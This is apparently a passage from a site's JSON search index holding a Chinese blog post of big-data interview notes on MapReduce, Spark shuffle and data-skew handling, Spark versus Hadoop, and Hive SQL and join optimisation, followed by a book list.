\u4e2d\u5904\u4e8e\u8fd0\u884c\u72b6\u6001\u7684 Task \u7684\u6570\u91cf\u5927\u4e8e\u7b49\u4e8e s2 \u7684 minShare \uff0c\u90a3\u4e48\u518d\u5bf9 taskToWeightRatio1 \u548c taskToWeightRatio2 \u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c taskToWeightRatio1 \u5c0f\u4e8e taskToWeightRatio2 \uff0c\u5219\u4f18\u5148\u8c03\u5ea6 s1 \uff1b\u5982\u679c taskToWeightRatio2 \u5c0f\u4e8e taskToWeightRatio1 \uff0c\u5219\u4f18\u5148\u8c03\u5ea6 s2 \u3002\u5982\u679c taskToWeightRatio1 \u548c taskToWeightRatio2 \u76f8\u7b49\uff0c\u8fd8\u9700\u8981\u5bf9 s1 \u548c s2 \u7684\u540d\u5b57\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c s1 \u7684\u540d\u5b57\u5c0f\u4e8e s2 \u7684\u540d\u5b57\uff0c\u5219\u4f18\u5148\u8c03\u5ea6 s1 \uff0c\u5426\u5219\u4f18\u5148\u8c03\u5ea6 s2 \u3002 taskToWeightRatio \u662f\u6b63\u5728\u8fd0\u884c\u7684\u4efb\u52a1\u6570\u91cf\u4e0e\u6743\u91cd \uff08weight\uff09 \u4e4b\u95f4\u7684\u6bd4\u503c\u3002 3.5. Spark\u54ea\u4e9b\u90e8\u5206\u53ef\u4ee5\u4f18\u5316 # \u8fd9\u7bc7 \u7f8e\u56e2\u6280\u672f\u56e2\u961f\u7684\u6587\u7ae0 \u5199\u5f97\u975e\u5e38\u8be6\u7ec6\u3002 3.6. Spark\u7684Shuffle\u8fc7\u7a0b # Shuffle \u9636\u6bb5\u53ef\u8fdb\u4e00\u6b65\u5212\u5206\u6210\u4e09\u90e8\u5206\uff1a Shuffle Write\u3001Shuffle Read \u548c aggregate \u3002 Shuffle Write \uff1a\u4e00\u6279\u4efb\u52a1 \uff08ShuffleMapTask\uff09 \u5c06\u7a0b\u5e8f\u8f93\u51fa\u7684\u4e34\u65f6\u6570\u636e\u5199\u5230\u672c\u5730\u78c1\u76d8\u3002\u7531\u4e8e\u6bcf\u4e2a\u4efb\u52a1\u4ea7\u751f\u7684\u6570\u636e\u8981\u88ab\u4e0b\u4e00\u4e2a\u9636\u6bb5\u7684\u6bcf\u4e2a\u4efb\u52a1\u8bfb\u53d6\u4e00\u90e8\u5206\uff0c\u56e0\u6b64\u5b58\u5165\u78c1\u76d8\u65f6\u9700\u5bf9\u6570\u636e\u5206\u533a\uff0c\u5206\u533a\u53ef\u4ee5\u4f7f\u7528Hash\u4e0eSort\u4e24\u79cd\u65b9\u6cd5\uff1b Shuffle Read \uff1a\u4e0b\u4e00\u4e2a\u9636\u6bb5\u542f\u52a8\u4e00\u6279\u65b0\u4efb\u52a1 \uff08ResultTask\uff09 \uff0c\u5b83\u4eec\u5404\u81ea\u542f\u52a8\u4e00\u4e9b\u7ebf\u7a0b\u8fdc\u7a0b\u8bfb\u53d6 Shuffle Write \u4ea7\u751f\u7684\u6570\u636e\uff1b Aggregate \uff1a\u4e00\u65e6\u6570\u636e\u88ab\u8fdc\u7a0b\u62f7\u8d1d\u8fc7\u6765\u540e\uff0c\u63a5\u4e0b\u6765\u9700\u6309\u7167 key \u5c06\u6570\u636e\u7ec4\u7ec7\u5728\u4e00\u8d77\uff0c\u4e3a\u540e\u7eed\u8ba1\u7b97\u505a\u51c6\u5907\u3002 3.7. Spark\u9047\u5230\u6570\u636e\u503e\u659c\u600e\u4e48\u529e # \u907f\u514d shuffle\uff0c\u53ef\u5728\u6570\u636e\u8f93\u5165 spark \u4e4b\u524d\u8fdb\u884c shuffle\uff0c\u6bd4\u5982\u5728 Hive \u4e2d\u6309\u7167 key \u8fdb\u884c\u5206\u7ec4\u3002\u6216\u8005 \u7528 map \u7b49\u66ff\u4ee3 shuffle\uff0c\u4e5f\u5c31\u662f\u5c06 reduce join \u53d8\u6210 map join\u3002\u5982\u679c\u5176\u4e2d\u6709\u4e00\u4e2a RDD \u5f88\u5c0f\uff0c\u5c31\u53ef\u4ee5\u91c7\u7528 \u5e7f\u64ad\u5c0f RDD + map \u5927 RDD \u5b9e\u73b0 join \u529f\u80fd\uff0c\u5728map\u4e2d\u5bf9\u5c0fRDD\u7684key\u8fdb\u884c\u904d\u5386\uff0c\u5982\u679ckey\u76f8\u540c\u5219\u6309\u7167\u89c4\u5219\u805a\u5408\u3002 \u5982\u679c\u907f\u514d\u4e0d\u4e86 shuffle\uff0c\u5c31\u51cf\u5c11 reduce task \u7684\u6570\u636e\u91cf\uff0c\u5982\u7f29\u5c0f key \u7c92\u5ea6\u3001\u589e\u52a0 reduce task \u6570\u91cf\u3002\u6216\u901a\u8fc7\u968f\u673a\u6570\u591a\u6b21\u805a\u5408\uff08\u52a0\u76d0\uff09\uff0c\u51cf\u5c11\u6bcf\u6b21\u805a\u5408\u7684\u6570\u636e\u91cf\uff0c\u805a\u5408\u4e4b\u540e\uff0c\u628a\u52a0\u4e86\u76d0\u7684key_salt \u518d\u8f6c\u56de key\uff0c\u7136\u540e\u5bf9 key \u518d\u6b21\u805a\u5408\u3002 \u5176\u4ed6\u60c5\u51b5\uff0c\u591a\u4e2a key \u5bfc\u81f4\u6570\u636e\u503e\u659c\uff0c\u65e0\u6cd5\u901a\u8fc7\u91c7\u6837\u786e\u5b9a\u54ea\u4e2a key \u6570\u636e\u91cf\u5927\u3002\u6211\u4eec\u5c31\u9700\u8981\u5bf9\u4e00\u4e2a RDD \u6269\u5bb9\uff0c\u5bf9\u53e6\u4e00\u4e2a RDD \u7a00\u91ca\uff0c\u518d\u8fdb\u884c join\u3002 \u53c2\u8003\u81ea \u535a\u5ba2\u56ed\u535a\u5ba2 \u3002 3.8. Spark\u548cHadoop\u7684\u533a\u522b # \u5e94\u7528\u573a\u666f\u4e0d\u540c Hadoop\u548cSpark\u4e24\u8005\u90fd\u662f\u5927\u6570\u636e\u6846\u67b6\uff0c\u4f46\u662f\u5404\u81ea\u5e94\u7528\u573a\u666f\u662f\u4e0d\u540c\u7684\u3002Hadoop\u662f\u4e00\u4e2a\u5206\u5e03\u5f0f\u6570\u636e\u5b58\u50a8\u67b6\u6784\uff0c\u5b83\u5c06\u5de8\u5927\u7684\u6570\u636e\u96c6\u5206\u6d3e\u5230\u4e00\u4e2a\u7531\u666e\u901a\u8ba1\u7b97\u673a\u7ec4\u6210\u7684\u96c6\u7fa4\u4e2d\u7684\u591a\u4e2a\u8282\u70b9\u8fdb\u884c\u5b58\u50a8\uff0c\u964d\u4f4e\u4e86\u786c\u4ef6\u7684\u6210\u672c\u3002Spark\u662f\u90a3\u4e48\u4e00\u4e2a\u4e13\u95e8\u7528\u6765\u5bf9\u90a3\u4e9b\u5206\u5e03\u5f0f\u5b58\u50a8\u7684\u5927\u6570\u636e\u8fdb\u884c\u5904\u7406\u7684\u5de5\u5177\uff0c\u5b83\u8981\u501f\u52a9hdfs\u7684\u6570\u636e\u5b58\u50a8\u3002 \u5904\u7406\u901f\u5ea6\u4e0d\u540c hadoop\u7684MapReduce\u662f\u5206\u6b65\u5bf9\u6570\u636e\u8fdb\u884c\u5904\u7406\u7684\uff0c\u4ece\u78c1\u76d8\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u8fdb\u884c\u4e00\u6b21\u5904\u7406\uff0c\u5c06\u7ed3\u679c\u5199\u5230\u78c1\u76d8\uff0c\u7136\u540e\u5728\u4ece\u78c1\u76d8\u4e2d\u8bfb\u53d6\u66f4\u65b0\u540e\u7684\u6570\u636e\uff0c\u518d\u6b21\u8fdb\u884c\u7684\u5904\u7406\uff0c\u6700\u540e\u518d\u5c06\u7ed3\u679c\u5b58\u5165\u78c1\u76d8\uff0c\u8fd9\u5b58\u53d6\u78c1\u76d8\u7684\u8fc7\u7a0b\u4f1a\u5f71\u54cd\u5904\u7406\u901f\u5ea6\u3002spark\u4ece\u78c1\u76d8\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u628a\u4e2d\u95f4\u6570\u636e\u653e\u5230\u5185\u5b58\u4e2d\uff0c\uff0c\u5b8c\u6210\u6240\u6709\u5fc5\u987b\u7684\u5206\u6790\u5904\u7406\uff0c\u5c06\u7ed3\u679c\u5199\u56de\u96c6\u7fa4\uff0c\u6240\u4ee5spark\u66f4\u5feb\u3002 \u5bb9\u9519\u6027\u4e0d\u540c Hadoop\u5c06\u6bcf\u6b21\u5904\u7406\u540e\u7684\u6570\u636e\u90fd\u5199\u5165\u5230\u78c1\u76d8\u4e0a\uff0c\u57fa\u672c\u8c08\u4e0d\u4e0a\u65ad\u7535\u6216\u8005\u51fa\u9519\u6570\u636e\u4e22\u5931\u7684\u60c5\u51b5\u3002Spark\u7684\u6570\u636e\u5bf9\u8c61\u5b58\u50a8\u5728\u5f39\u6027\u5206\u5e03\u5f0f\u6570\u636e\u96c6 RDD\uff0cRDD\u662f\u5206\u5e03\u5728\u4e00\u7ec4\u8282\u70b9\u4e2d\u7684\u53ea\u8bfb\u5bf9\u8c61\u96c6\u5408\uff0c\u5982\u679c\u6570\u636e\u96c6\u4e00\u90e8\u5206\u4e22\u5931\uff0c\u5219\u53ef\u4ee5\u6839\u636e\u4e8e\u6570\u636e\u884d\u751f\u8fc7\u7a0b\u5bf9\u5b83\u4eec\u8fdb\u884c\u91cd\u5efa\u3002\u800c\u4e14RDD \u8ba1\u7b97\u65f6\u53ef\u4ee5\u901a\u8fc7 CheckPoint \u6765\u5b9e\u73b0\u5bb9\u9519\u3002 \u53c2\u8003\u81ea \u77e5\u4e4e\u6587\u7ae0 \u3002 4. Hive # 4.1. Hive\u7684\u4f5c\u7528 # Hive \u662f\u4e00\u4e2a\u6570\u636e\u4ed3\u5e93\u5de5\u5177\uff0c\u5b83\u975e\u5e38\u9002\u5408\u6570\u636e\u7684\u7edf\u8ba1\u5206\u6790\uff0c\u5b83\u53ef\u4ee5\u5c06\u6570\u636e\u6587\u4ef6\u7ec4\u6210\u8868\u683c\u5e76\u5177\u6709\u5b8c\u6574\u7684\u7c7b SQL \u67e5\u8be2\u529f\u80fd\uff0c\u8fd8\u53ef\u5c06\u7c7b SQL \u8bed\u53e5\u81ea\u52a8\u8f6c\u6362\u6210 MapReduce \u4efb\u52a1\u6765\u8fd0\u884c\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4f7f\u7528 Hive \uff0c\u53ef\u4ee5\u5927\u5e45\u63d0\u9ad8\u5f00\u53d1\u6548\u7387\u3002 \u548c\u4f20\u7edf\u7684\u6570\u636e\u4ed3\u5e93\u4e00\u6837\uff0c Hive \u4e3b\u8981\u7528\u6765\u8bbf\u95ee\u548c\u7ba1\u7406\u6570\u636e\u3002\u4e0e\u4f20\u7edf\u6570\u636e\u4ed3\u5e93\u8f83\u5927\u7684\u533a\u522b\u662f\uff0c Hive \u53ef\u4ee5\u5904\u7406\u8d85\u5927\u89c4\u6a21\u7684\u6570\u636e\uff0c\u53ef\u6269\u5c55\u6027\u548c\u5bb9\u9519\u6027\u975e\u5e38\u5f3a\u3002\u7531\u4e8e Hive \u6709\u7c7b SQL \u7684\u67e5\u8be2\u8bed\u8a00\uff0c\u6240\u4ee5\u5b66\u4e60\u6210\u672c\u76f8\u5bf9\u6bd4\u8f83\u4f4e\u3002 \u533a\u522b Hive RDBMS \u67e5\u8be2\u8bed\u8a00 HQL SQL \u6570\u636e\u5b58\u50a8\u4f4d\u7f6e HDFS Local FS \u6570\u636e\u683c\u5f0f\u5224\u65ad \u67e5\u8be2\u65f6\u5224\u65ad \u63d2\u5165\u65f6\u5224\u65ad \u6267\u884c MR Executor \u6267\u884c\u5ef6\u8fdf \u9ad8 \u4f4e \u5904\u7406\u6570\u636e\u89c4\u6a21 \u5927 \u5c0f 4.2. Hive SQL\u4f18\u5316 # join \u65e0\u5173\u7684\u4f18\u5316 group by\u5f15\u8d77\u7684\u503e\u659c\u4f18\u5316 set hive.map.aggr = true set hive.groupby.skewindata=true \u6b64\u65f6 Hive \u5728\u6570\u636e\u503e\u659c\u7684\u65f6\u5019\u4f1a\u8fdb\u884c\u8d1f\u8f7d\u5747\u8861\uff0c\u751f\u6210\u7684\u67e5\u8be2\u8ba1\u5212\u4f1a\u6709\u4e24\u4e2a MapReduce Job \u3002\u7b2c\u4e00\u4e2a MapReduce Job \u4e2d\uff0c Map \u7684\u8f93\u51fa\u7ed3\u679c\u96c6\u5408\u4f1a\u968f\u673a\u5206\u5e03\u5230 Reduce \u4e2d\uff0c\u6bcf\u4e2a Reduce \u505a\u90e8\u5206\u805a\u5408\u64cd\u4f5c\u5e76\u8f93\u51fa\u7ed3\u679c\uff0c\u8fd9\u6837\u5904\u7406\u7684\u7ed3\u679c\u662f\u76f8\u540c\u7684 GroupByKey \u6709\u53ef\u80fd\u88ab\u5206\u5e03\u5230\u4e0d\u540c\u7684 Reduce \u4e2d\uff0c\u4ece\u800c\u8fbe\u5230\u8d1f\u8f7d\u5747\u8861\u7684\u76ee\u7684\uff1b\u7b2c\u4e8c\u4e2a MapReduce Job \u518d\u6839\u636e\u9884\u5904\u7406\u7684\u6570\u636e\u7ed3\u679c\u6309\u7167 GroupBy Key \u5206\u5e03\u5230 Reduce \u4e2d\uff08\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u4ee5\u4fdd\u8bc1\u76f8\u540c\u7684 GroupBy Key \u88ab\u5206\u5e03\u5230\u540c\u4e00\u4e2a Reduce \u4e2d\uff09\uff0c\u6700\u540e\u5b8c\u6210\u6700\u7ec8\u7684\u805a\u5408\u64cd\u4f5c count distinct \u4f18\u5316 \u4f7f\u7528 count distinct \uff0c\u5f88\u5bb9\u6613\u5f15\u8d77\u6027\u80fd\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5148 group by \u518d count \u7684\u65b9\u5f0f\u6765\u4f18\u5316\u3002 4.3. Hive SQL\u4e2d\u7684Join\u4f18\u5316\u65b9\u6cd5 # \u5927\u8868 Join \u5c0f\u8868\u4f18\u5316 \u53ef\u4ee5\u901a\u8fc7 mapjoin \u7684\u65b9\u5f0f\u6765\u4f18\u5316\uff0c\u53ea\u9700\u6dfb\u52a0 mapjoin hint \u5373\u53ef\u3002 select /*+mapjoin(b)*/ \u5927\u8868 Join \u5927\u8868\u4f18\u5316 \u5c3d\u7ba1B\u8868\u65e0\u6cd5\u76f4\u63a5 mapjoin \uff0c\u4f46\u53ef\u4ee5\u95f4\u63a5\u5730 mapjoin \u5b83\u3002 \u6b64\u601d\u8def\u6709\u4e24\u79cd\u9014\u5f84\uff1a\u9650\u5236\u884c\u548c\u9650\u5236\u5217\u3002 \u9650\u5236\u884c\u7684\u601d\u8def\u662f\u4e0d\u9700\u8981 Join B \u5168\u8868\uff0c\u800c\u53ea\u9700\u8981 Join \u5176\u5728 A \u8868\u4e2d\u5b58\u5728\u7684\u3002 \u9650\u5236\u5217\u7684\u601d\u8def\u662f\u53ea\u53d6\u9700\u8981\u7684\u5b57\u6bb5\u3002 Join \u65f6\u7528 case when \u8bed\u53e5 \u5176\u6838\u5fc3\u662f\u5c06\u8fd9\u4e9b\u5f15\u8d77\u503e\u659c\u7684\u503c\u968f\u673a\u5206\u53d1\u5230 Reduce \uff0c\u5176\u4e3b\u8981\u6838\u5fc3\u903b\u8f91\u5728\u4e8e Join \u65f6\u5bf9\u8fd9\u4e9b\u7279\u6b8a\u503c Concat \u968f\u673a\u6570\uff0c\u4ece\u800c\u8fbe\u5230\u968f\u673a\u5206\u53d1\u7684\u76ee\u7684\u3002 5. \u53c2\u8003\u4e66\u7c4d # \u300a\u4ece\u96f6\u5f00\u59cb\u5b66Hadoop\u5927\u6570\u636e\u5206\u6790\u300b. \u6e29\u6625\u6c34\u3001\u6bd5\u6d01\u99a8 \u300a\u4f01\u4e1a\u7ea7\u5927\u6570\u636e\u5e73\u53f0\u6784\u5efa\uff1a\u67b6\u6784\u4e0e\u5b9e\u73b0\u300b. \u6731\u51ef \u300aSpark\u6280\u672f\u5185\u5e55\uff1a\u6df1\u5165\u89e3\u6790Saprk\u5185\u6838\u67b6\u6784\u8bbe\u8ba1\u4e0e\u5b9e\u73b0\u539f\u7406\u300b. \u5f20\u5b89\u7ad9 \u300a\u5927\u6570\u636e\u6280\u672f\u4f53\u7cfb\u8be6\u89e3\uff1a\u539f\u7406\u3001\u67b6\u6784\u4e0e\u5b9e\u8df5\u300b. \u8463\u897f\u6210 \u300a\u79bb\u7ebf\u548c\u5b9e\u65f6\u5927\u6570\u636e\u5f00\u53d1\u5b9e\u6218\u300b. \u6731\u677e\u5cad \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.\u5927\u6570\u636e\u7814\u53d1\u5de5\u7a0b\u5e08\u9762\u8bd5\u9898\u6574\u7406"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#_1","text":"","title":"\u5927\u6570\u636e\u7814\u53d1\u5de5\u7a0b\u5e08\u9762\u8bd5\u9898\u6574\u7406"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#_2","text":"\u5927\u6570\u636e\u7814\u53d1\u5de5\u7a0b\u5e08\u9762\u8bd5\u9898\u6574\u7406 \u76ee\u5f55 1. \u80cc\u666f 2. Hadoop 2.1. \u4ecb\u7ecdMapReduce 2.2. MapReduce\u4e2d\u95f4\u7684Combine\u7684\u4f5c\u7528 2.3. MapReduce\u51fa\u73b0\u6570\u636e\u503e\u659c\u600e\u4e48\u89e3\u51b3 2.4. \u4ecb\u7ecdYarn 2.5. \u4ecb\u7ecdZookeeper 3. Spark 3.1. Spark\u7684\u5bbd\u7a84\u4f9d\u8d56 3.2. Spark\u7684Stage\u662f\u600e\u4e48\u5212\u5206\u7684\uff0c\u5982\u4f55\u4f18\u5316 3.3. \u4ecb\u7ecdSpark\u7684RDD 3.4. Spark\u7684TaskScheduler\u662f\u600e\u4e48\u5206\u914dTask\u7684 3.5. Spark\u54ea\u4e9b\u90e8\u5206\u53ef\u4ee5\u4f18\u5316 3.6. Spark\u7684Shuffle\u8fc7\u7a0b 3.7. Spark\u9047\u5230\u6570\u636e\u503e\u659c\u600e\u4e48\u529e 3.8. Spark\u548cHadoop\u7684\u533a\u522b 4. Hive 4.1. Hive\u7684\u4f5c\u7528 4.2. Hive SQL\u4f18\u5316 4.3. Hive SQL\u4e2d\u7684Join\u4f18\u5316\u65b9\u6cd5 5. \u53c2\u8003\u4e66\u7c4d","title":"\u76ee\u5f55"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#1","text":"\u6700\u8fd1\u6574\u7406\u4e86\u5927\u6570\u636e\u7814\u53d1\u5de5\u7a0b\u5e08\u7684\u4e00\u4e9b\u9762\u8bd5\u9898\uff0c\u4f46\u5728\u9762\u8bd5\u7684\u8fc7\u7a0b\u4e2d\u88ab\u5361\u5728\u4e86\u7b97\u6cd5\u9898\u4e0a\uff0c\u9762\u8bd5\u5b98\u5efa\u8bae\u81f3\u5c11\u8981\u628aLeetCode\u524d400\u9898\u505a\u4f1a\uff0c\u770b\u6765\u8fd8\u662f\u5f97\u4e0d\u65ad\u63d0\u9ad8\u81ea\u5df1\u7684\u7b97\u6cd5\u80fd\u529b\u3002 \u4e4b\u524d\u6574\u7406\u7684\u9762\u8bd5\u9898\u5728\u8fd9\u91cc\u5206\u4eab\u4e00\u4e0b\u3002\u5927\u90e8\u5206\u53c2\u8003\u81ea\u4e66\u7c4d\uff0c\u5728\u6587\u7ae0\u6700\u540e\u5217\u51fa\u4e86\u53c2\u8003\u4e66\u76ee\uff0c\u6709\u4e00\u4e9b\u4e5f\u53c2\u8003\u81ea\u535a\u5ba2\uff0c\u5728\u5185\u5bb9\u4e0b\u65b9\u8fdb\u884c\u4e86\u6807\u6ce8\u3002 \u9898\u76ee\u6765\u6e90\uff1a \u77e5\u4e4e\u56de\u7b54\uff1a\u5b57\u8282\u8df3\u52a8\u5927\u6570\u636e\u7814\u53d1\u9762\u8bd5\u4e00\u822c\u4f1a\u95ee\u4ec0\u4e48\u65b9\u5411 \u3002 \u95ee\u9898\u8303\u56f4\u5305\u62ec Hadoop \u3001 Saprk \u3001\u8ba1\u7b97\u673a\u4e13\u4e1a\u8bfe\u3001\u6570\u636e\u5e93\u8fd8\u6709\u7b97\u6cd5\u9898\uff0c\u8fd9\u91cc\u4e3b\u8981\u6574\u7406\u4e86 Hadoop \u3001 Saprk \u7684\u5185\u5bb9\u3002 \u5927\u6570\u636e\u5165\u95e8\u63a8\u8350\u5b66\u4e60 \u300a\u5927\u89c4\u6a21\u6570\u636e\u5904\u7406\u5b9e\u6218\u300b \u8bfe\u7a0b\u3002","title":"1. \u80cc\u666f"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#2-hadoop","text":"","title":"2. Hadoop"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#21-mapreduce","text":"MapReduce \u662f\u4e3a\u4e86\u8fdb\u884c\u5927\u89c4\u6a21\u6570\u636e\u5904\u7406\u4e0e\u8ba1\u7b97\u800c\u5b9e\u73b0\u7684\u4e00\u4e2a\u6a21\u578b\u3002 MapReduce \u7684\u6267\u884c\u8fc7\u7a0b\u53ef\u4ee5\u5206\u4e3a\u4e94\u4e2a\u9636\u6bb5\u3002 \u9996\u5148\u662f Split \u9636\u6bb5\uff0c\u5c06\u6570\u636e\u5207\u5206\u6210\u591a\u4efd\uff0c\u53d1\u9001\u5230\u5404\u4e2a\u8ba1\u7b97\u8282\u70b9\u4e0a\u3002 \u7136\u540e\u662f Map \u9636\u6bb5\uff0c Map \u64cd\u4f5c\u901a\u8fc7\u4f20\u5165\u4e00\u4e2a\u51fd\u6570\uff0c\u5c06\u8fd9\u4e2a\u51fd\u6570\u4f5c\u7528\u4e8e\u6bcf\u4e2a\u5b58\u50a8\u7684\u952e\u503c\u5bf9 \uff08key-value\uff09 \u4e0a\uff0c\u5f62\u6210\u4e2d\u95f4\u7ed3\u679c\u3002 \u63a5\u4e0b\u6765\u662f Shuffle \uff08\u6d17\u724c\uff09\u9636\u6bb5\u3002 Shuffle \u9636\u6bb5\u7531 Partition\u3001Sort\u548cCombine \u4e09\u4e2a\u64cd\u4f5c\u7ec4\u6210\uff0c Partition \uff08\u5206\u533a\uff09\u64cd\u4f5c\u5c06\u4e2d\u95f4\u7ed3\u679c\u6309\u7167\u7ed9\u5b9a\u7684\u89c4\u5219\u91cd\u65b0\u5206\u5272\uff0c\u9ed8\u8ba4\u662f\u6309\u7167 key\u7684hash\u503c mod reduce\u4efb\u52a1\u6570\u91cf \u8fdb\u884c\u5206\u533a\u3002\u7136\u540e\u662f Sort \u8fc7\u7a0b\uff0c Sort \uff08\u6392\u5e8f\uff09\u64cd\u4f5c\u5c06\u6bcf\u4e2a\u5206\u533a\u5185\u7684\u6570\u636e\u6309\u7167\u952e\uff08key\uff09\u7684\u5b57\u6bcd\u987a\u5e8f\u8fdb\u884c\u6392\u5e8f\u3002 Shuffle \u9636\u6bb5\u7684\u6700\u540e\u8fd8\u5b58\u5728 Combine \u8fc7\u7a0b\uff0c Combine \uff08\u5408\u5e76\uff09\u64cd\u4f5c\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a\u5c0f\u578b\u7684 Reduce \u64cd\u4f5c\uff0c\u53ef\u4ee5\u4f7f\u7528\u7528\u6237\u5b9a\u4e49\u7684 Combiner \u51fd\u6570\u5bf9\u6570\u636e\u8fdb\u884c\u521d\u6b65\u5408\u5e76\uff0c\u51cf\u5c0f\u6570\u636e\u7684\u89c4\u6a21\uff0c\u964d\u4f4e I/O \u548c\u7f51\u7edc\u4f20\u8f93\u7684\u6210\u672c\u3002\u6700\u540e\u5c06\u6570\u636e\u4f20\u8f93\u7ed9 Reduce \u4efb\u52a1\u3002 \u7b2c\u56db\u4e2a\u9636\u6bb5\u662f Reduce \u9636\u6bb5\u3002 Reduce \u4f7f\u7528\u4f20\u5165\u7684\u51fd\u6570\u5bf9\u4e2d\u95f4\u7ed3\u679c\u8fdb\u884c\u805a\u5408\u4e0e\u8fd0\u7b97\uff0c\u8f93\u51fa\u4e0b\u4e00\u6b65\u7684\u4e2d\u95f4\u7ed3\u679c\u6216\u8005\u6700\u7ec8\u7ed3\u679c\u3002 \u6700\u540e\u4e00\u4e2a\u9636\u6bb5\u5c31\u662f Output \u9636\u6bb5\u3002\u5c06\u5904\u7406\u5b8c\u6210\u7684\u6700\u7ec8\u7ed3\u679c\u8f93\u51fa\uff0c\u6216\u8005\u5c06\u7ed3\u679c\u5199\u5165\u6587\u4ef6\u4e2d\u3002 \u4e00\u4e2a\u5b8c\u6574\u7684\u5927\u6570\u636e\u5904\u7406\u7a0b\u5e8f\u53ef\u4ee5\u7531\u591a\u4e2a MapReduce \u8fc7\u7a0b\u7ec4\u6210\u3002 Hadoop \u6846\u67b6\u662f\u6bd4\u8f83\u6d41\u884c\u7684 MapReduce \u5f00\u6e90\u5b9e\u73b0\u3002","title":"2.1. \u4ecb\u7ecdMapReduce"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Spark/2.%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%A0%94%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/#22-mapreducecombine","text":"Combine \uff08\u5408\u5e76\uff09\u64cd\u4f5c\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u4e2a\u5c0f\u578b\u7684 Reduce \u64cd\u4f5c\uff0c\u53ef\u4ee5\u4f7f\u7528\u7528\u6237\u5b9a\u4e49\u7684 Combiner \u51fd\u6570\u5bf9\u6570\u636e\u8fdb\u884c\u521d\u6b65\u5408\u5e76\uff0c\u51cf\u5c0f\u6570\u636e\u7684\u89c4\u6a21\uff0c\u964d\u4f4e I/O \u548c\u7f51\u7edc\u4f20\u8f93\u7684\u6210\u672c\u3002 \u6bcf\u4e2a\u8ba1\u7b97\u8282\u70b9\u63d0\u4f9b\u7ed9 MapReduce \u7684\u7f13\u5b58\u7684\u5bb9\u91cf\u662f\u6709\u9650\u7684\uff0c\u6570\u636e\u89c4\u6a21\u6bd4\u8f83\u5927\u65f6\uff0c\u7f13\u5b58\u4e2d Map \u7ed3\u679c\u7684\u6570\u91cf\u4f1a\u4e0d\u65ad\u589e\u52a0\uff0c\u5f88\u5feb\u5c31\u4f1a\u5360\u6ee1\u6574\u4e2a\u7f13\u5b58\u3002\u8fd9\u65f6\uff0c\u5c31\u5fc5\u987b\u542f\u52a8\u6ea2\u5199\uff08 Spill \uff09\u64cd\u4f5c\uff0c\u628a\u7f13\u5b58\u4e2d\u7684\u5185\u5bb9\u4e00\u6b21\u6027\u5199\u5165\u78c1\u76d8\uff0c\u5e76\u6e05\u7a7a\u7f13\u5b58\u3002\u5982\u679c\u7528\u6237\u4e8b\u5148\u5b9a\u4e49\u4e86 Combiner \u51fd\u6570\uff0c\u5219\u8fd9\u4e2a\u65f6\u5019\u4f1a\u6267\u884c\u5408\u5e76\u64cd\u4f5c\uff0c\u4ece\u800c\u51cf\u5c11\u9700\u8981\u6ea2\u5199\u5230\u78c1\u76d8\u7684\u6570\u636e\u91cf\u3002 \u5728Reduce\u4efb\u52a1\u5f00\u59cb\u524d\uff0c\u5b83\u9700\u8981\u4eceMap\u7aef\u201c\u9886\u53d6\u201d\uff08 Fetch \uff09\u5bf9\u5e94\u5206\u533a\u7684\u6570\u636e\uff0c\u8fd9\u65f6\u5019\u6570\u636e\u53ef\u80fd\u9700\u8981\u901a\u8fc7\u7f51\u7edc\u4f20\u8f93\uff0c Combine 